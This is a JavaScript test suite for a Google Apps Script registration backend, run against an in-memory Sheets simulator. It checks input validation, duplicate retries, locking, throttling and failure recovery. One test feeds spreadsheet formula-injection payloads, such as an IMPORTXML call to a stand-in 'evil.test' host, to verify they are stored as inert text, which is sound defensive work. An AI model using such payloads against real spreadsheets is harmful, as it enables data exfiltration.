// Entirely in-memory Apps Script/Sheets simulator. No HTTP, Google, or live data.
import assert from "node:assert/strict";
import { createContext, runInContext } from "node:vm";
import { readFileSync } from "node:fs";
import { createHmac, randomUUID } from "node:crypto";

const source = readFileSync("google_apps_script.js", "utf8");
export const validRegistration = {
  englishName: "Contract Test", khmerName: "សុខ ដារ៉ា", gender: "Male", dob: "2000-01-15",
  phone: "012345678", email: "test@example.com", height: "175", weight: "65",
  nationality: "Cambodian", address: "Example Street", country: "Cambodia", city: "Phnom Penh Capital",
  district: "Boeng Keng Kang", commune: "Olympic", school: "", emergencyContact: "陈 明",
  emergencyPhone: "012345678", relationship: "Parent", medicalNotes: "", allergies: "", migrationNotes: "",
  branch: "Olympic", schedule: "Saturday - Sunday 9:00 - 11:00 AM", belt: "White",
  medicalConditions: "None", medications: "None", pastInjuries: "None", otherSports: "None",
  liabilityWaiver: "Agreed", privacyPolicy: "Agreed", mediaPrivacy: "Agreed", parentConsent: "N/A",
  howHear: "Facebook", signature: "Contract Test",
};
function event(data) {
  const contents = new URLSearchParams(data).toString();
  return { parameter: { ...data }, parameters: Object.fromEntries(Object.entries(data).map(([key, value]) => [key, [value]])), postData: { contents, length: contents.length, type: "application/x-www-form-urlencoded" } };
}
export function backendHarness({ blank = false } = {}) {
  const properties = new Map([["REGISTRATION_SPREADSHEET_ID", "isolated-test-spreadsheet"]]);
  const rows = [];
  const formats = [];
  const state = { locked: false, sheet: !blank, calls: 0, writes: 0, fail: "", frozen: 0, maxRows: 1000, now: Date.UTC(2026, 9, 30, 6) };
  class Clock extends Date { constructor(...args) { super(...(args.length ? args : [state.now])); } static now() { return state.now; } }
  const store = {
    getProperty: key => properties.get(key) ?? null,
    getProperties: () => Object.fromEntries(properties),
    deleteProperty: key => properties.delete(key),
    setProperty(key, value) {
      if (state.fail === "reserve" && value.includes('"pending"')) throw new Error("Private storage error");
      if (state.fail === "commit" && value.includes('"committed"')) throw new Error("Private receipt error");
      properties.set(key, value);
    },
    setProperties: values => { for (const [key, value] of Object.entries(values)) properties.set(key, value); },
  };
  function range(row, col, height, width) {
    assert.equal(height, 1);
    const read = () => Array.from({ length: width }, (_, i) => rows[row - 1]?.[col - 1 + i] ?? "");
    return {
      getValues: () => [read()],
      getFormulas: () => [read().map(v => typeof v === "string" && v.startsWith("=") ? v : "")],
      isBlank: () => read().every(v => v === ""),
      setNumberFormat(value) { formats.push({ row, col, width, value }); },
      setValues(values) {
        assert.ok(state.locked, "Every sheet write requires the script lock");
        assert.equal(values.length, 1);
        assert.equal(values[0].length, width);
        if (row > 1 && state.fail === "before") throw new Error("Private failure before write");
        if (state.onWrite && row > 1) { const hook = state.onWrite; state.onWrite = null; hook(); }
        rows[row - 1] ??= [];
        values[0].forEach((v, i) => { rows[row - 1][col - 1 + i] = v; });
        state.writes++;
        if (row > 1 && state.fail === "after") throw new Error("Private failure after write");
      },
    };
  }
  const sheet = { getRange: range, getSheetId: () => 42, getLastRow: () => rows.length, setFrozenRows: n => { state.frozen = n; }, getMaxRows: () => state.maxRows, insertRowsAfter: (_row, count) => { state.maxRows += count; } };
  const context = createContext({
    Date: Clock,
    Utilities: {
      Charset: { UTF_8: "UTF-8" }, getUuid: randomUUID,
      computeHmacSha256Signature: (text, key) => Array.from(createHmac("sha256", key).update(text).digest()),
      formatDate: () => new Date(state.now).toISOString().slice(0, 10),
    },
    SpreadsheetApp: {
      getActiveSpreadsheet() { throw new Error("No active spreadsheet in a web app"); },
      openById(id) { assert.equal(id, "isolated-test-spreadsheet"); state.calls++; return {
        getId: () => "isolated-test-spreadsheet", getSheetByName: () => state.sheet ? sheet : null,
        insertSheet: () => { state.sheet = true; return sheet; },
      }; },
      flush() { if (state.fail === "flush") throw new Error("Private flush error"); },
    },
    PropertiesService: { getScriptProperties: () => store },
    LockService: { getScriptLock: () => ({
      tryLock() { if (state.locked || state.fail === "lock") return false; state.locked = true; return true; },
      releaseLock() { state.locked = false; },
    }) },
    ContentService: { MimeType: { JSON: "application/json" }, createTextOutput: text => ({ setMimeType: () => text }) },
  });
  runInContext(source, context);
  const headers = ["Timestamp", ...context.REGISTRATION_FIELDS.map(field => field[1])];
  if (!blank) rows.push(headers, Array(35).fill("EXISTING RECORD MUST STAY UNCHANGED"));
  return { context, rows, properties, state, formats, request(data = validRegistration) { return JSON.parse(context.doPost(event(data))); }, raw: e => JSON.parse(context.doPost(e)) };
}
let cases = 0;
function test(name, run) { run(); cases++; console.log("PASS", name); }

test("health GET is read-only and contains no registration data", () => {
  const h = backendHarness();
  assert.deepEqual(JSON.parse(h.context.doGet()), { status: "ok", service: "infinity-registration", version: "2026-10-30.1", ready: true });
  assert.equal(h.state.calls, 1); assert.equal(h.properties.size, 1); assert.equal(h.state.writes, 0);
  h.rows[0][1] = "Unexpected header";
  assert.equal(JSON.parse(h.context.doGet()).ready, false);
  h.properties.delete("REGISTRATION_SPREADSHEET_ID");
  assert.equal(JSON.parse(h.context.doGet()).ready, false);
  assert.equal(h.request().code, "configuration");
  assert.equal(h.state.writes, 0);
});
test("original 34-field/35-column contract and historic rows retained", () => {
  const h = backendHarness(), original = structuredClone(h.rows);
  assert.deepEqual(Object.keys(validRegistration), Array.from(h.context.REGISTRATION_FIELDS, f => f[0]));
  assert.equal(h.request().status, "success");
  assert.deepEqual(h.rows.slice(0, 2), original);
  assert.equal(h.rows[2].length, 35); assert.equal(h.rows[2][7], "175"); assert.equal(h.rows[2][8], "65");
  assert.equal(h.rows[2][22], "Olympic"); assert.equal(h.rows[2][29], "Agreed");
  assert.ok(h.formats.every(f => f.row > 2 && f.value === "@"));
});
test("required fields, lengths, calendar dates, enums, measurements, signatures and consent reject before storage", () => {
  const mutations = [
    { englishName: "" }, { englishName: "---" }, { englishName: 42 }, { school: "a".repeat(241) },
    { dob: "2000-02-31" }, { dob: "2025-01-01" }, { dob: "1900-01-01" }, { gender: "unknown" },
    { height: "NaN" }, { height: "231" }, { weight: "19" }, { weight: "2e2" },
    { email: "bad" }, { phone: "123" }, { emergencyPhone: "123" }, { belt: "invented" },
    { branch: "unknown" }, { schedule: "wrong" }, { relationship: "invented" }, { howHear: "invented" },
    { liabilityWaiver: "No" }, { privacyPolicy: "true" }, { mediaPrivacy: "No" }, { parentConsent: "bad" },
    { signature: "Other Name" }, { medicalNotes: "private\u0000text" }, { city: "" }, { unknown: "value" },
  ];
  for (const mutation of mutations) {
    const h = backendHarness(); assert.equal(h.request({ ...validRegistration, ...mutation }).status, "error");
    assert.equal(h.state.calls, 0); assert.equal(h.properties.size, 1); assert.equal(h.state.writes, 0);
  }
});
test("duplicate parameters, oversized bodies and unexpected content types are refused", () => {
  for (const mutate of [e => { e.parameters.email.push("second@example.com"); }, e => { e.postData.type = "application/json"; }, e => { e.postData.length = 196609; }, e => { delete e.parameters; }]) {
    const h = backendHarness(), e = event(validRegistration); mutate(e);
    assert.equal(h.raw(e).status, "error"); assert.equal(h.state.calls, 0);
  }
});
test("minor consent, age boundaries, international addresses and canonical schedules work", () => {
  const h = backendHarness();
  assert.equal(h.context.registrationAge_("2020-10-30", "2026-10-30"), 6);
  assert.equal(h.context.registrationAge_("2020-10-31", "2026-10-30"), 5);
  assert.equal(h.context.registrationAge_("1926-10-30", "2026-10-30"), 100);
  for (const changes of [{ parentConsent: "No" }, { relationship: "Friend", parentConsent: "Agreed" }])
    assert.equal(h.request({ ...validRegistration, dob: "2015-01-15", ...changes }).status, "error");
  assert.equal(h.request({ ...validRegistration, dob: "2015-01-15", parentConsent: "Agreed" }).status, "success");
  for (const schedule of ["Saturday - Sunday: 9:30 - 11:30 AM", "Tuesday - Wednesday: 6:00 - 8:00 PM (General)"])
    assert.equal(backendHarness().request({ ...validRegistration, country: "China", city: "", district: "", commune: "", branch: "KoukKhleang", schedule }).status, "success");
});
test("formula payloads become literal text; Unicode, medical comparisons and phone zeroes survive", () => {
  for (const medicalNotes of ['=IMPORTXML("https://evil.test")', "+cmd", "-command", "@SUM(1)", "'=formula", "ខ្មែរ 中文 < 5 mg > 2 hours"]) {
    const h = backendHarness(); assert.equal(h.request({ ...validRegistration, medicalNotes }).status, "success");
    const stored = h.rows[2][19]; assert.ok(!stored.startsWith("="));
    assert.ok(stored === medicalNotes || stored === "'" + medicalNotes);
    assert.equal(h.rows[2][5], "012345678"); assert.equal(h.rows[2][16], "陈 明");
  }
});
test("identical retries append exactly once and metadata contains no raw personal data", () => {
  const h = backendHarness(); assert.equal(h.request().status, "success");
  for (let i = 0; i < 10; i++) assert.equal(h.request().duplicate, true);
  assert.equal(h.rows.length, 3);
  const metadata = JSON.stringify(Object.fromEntries(h.properties));
  for (const text of ["Contract Test", "test@example.com", "012345678", "Example Street"]) assert.ok(!metadata.includes(text));
});
test("simultaneous calls cannot append twice; locks are released", () => {
  const h = backendHarness(); let nested;
  h.state.onWrite = () => { nested = h.request(); };
  assert.equal(h.request().status, "success"); assert.equal(nested.code, "busy");
  assert.equal(h.rows.length, 3); assert.equal(h.state.locked, false);
});
test("failure after writing or during flush recovers the existing row without another write", () => {
  for (const fail of ["after", "flush"]) {
    const h = backendHarness(); h.state.fail = fail;
    assert.equal(h.request().status, "error"); assert.equal(h.rows.length, 3);
    h.state.fail = ""; assert.equal(h.request().duplicate, true); assert.equal(h.rows.length, 3);
  }
});
test("ambiguous pre-write failure never expires or automatically appends on retry", () => {
  const h = backendHarness(); h.state.fail = "before"; assert.equal(h.request().status, "error");
  h.state.fail = ""; h.state.now += 8 * 86400000;
  assert.equal(h.request().code, "write_uncertain"); assert.equal(h.rows.length, 2);
});
test("receipt finalization failure still succeeds and retry checks the written row", () => {
  const h = backendHarness(); h.state.fail = "commit"; assert.equal(h.request().status, "success");
  h.state.fail = ""; assert.equal(h.request().duplicate, true); assert.equal(h.rows.length, 3);
});
test("reservation failure writes no row; missing HMAC key fails closed", () => {
  const h = backendHarness(); h.state.fail = "reserve"; assert.equal(h.request().status, "error"); assert.equal(h.rows.length, 2);
  h.state.fail = ""; assert.equal(h.request().status, "success");
  h.properties.delete("INFINITY_V2_HASH_KEY"); assert.equal(h.request().code, "storage_unavailable"); assert.equal(h.rows.length, 3);
});
test("contact/global throttles, pause switch, schema mismatch and capacity fail without data changes", () => {
  const h = backendHarness();
  for (let i = 0; i < 5; i++) assert.equal(h.request({ ...validRegistration, address: "Street " + i }).status, "success");
  assert.equal(h.request({ ...validRegistration, address: "Street 6" }).code, "rate_limited"); assert.equal(h.rows.length, 7);
  for (const mode of ["pause", "schema", "capacity", "global", "lock"]) {
    const t = backendHarness(), original = structuredClone(t.rows);
    if (mode === "pause") t.properties.set("REGISTRATION_PAUSED", "true");
    if (mode === "schema") { t.rows[0][1] = "Unexpected header"; original[0][1] = "Unexpected header"; }
    if (mode === "capacity") t.properties.set("OTHER_APP", "x".repeat(350001));
    if (mode === "global") t.properties.set("INFINITY_V2_RATE_GLOBAL", JSON.stringify({ count: 60, expires: t.state.now + 10000 }));
    if (mode === "lock") t.state.fail = "lock";
    assert.equal(t.request().status, "error"); assert.deepEqual(t.rows, original); assert.equal(t.state.locked, false);
  }
});
test("first-use initializes only the new registration tab; no sheet deletion API exists", () => {
  const h = backendHarness({ blank: true }); assert.equal(h.request().status, "success");
  assert.equal(h.rows.length, 2); assert.equal(h.rows[0].length, 35); assert.equal(h.state.frozen, 1);
});
test("full sheets grow without rewriting records; expired committed receipts and rate counters are bounded", () => {
  const h = backendHarness(); h.state.maxRows = 2;
  assert.equal(h.request().status, "success"); assert.equal(h.state.maxRows, 3);
  h.properties.set("UNRELATED_SETTING", "keep");
  h.state.now += 8 * 86400000;
  assert.equal(h.request().status, "success"); assert.equal(h.rows.length, 4);
  assert.equal(h.properties.get("UNRELATED_SETTING"), "keep");
});
test("internal exception details never appear in API responses", () => {
  const h = backendHarness(); h.state.fail = "before"; const response = h.request();
  assert.ok(!JSON.stringify(response).includes("Private")); assert.equal(response.code, "unavailable");
});
console.log(`PASS ${cases} backend security scenarios; zero live requests`);
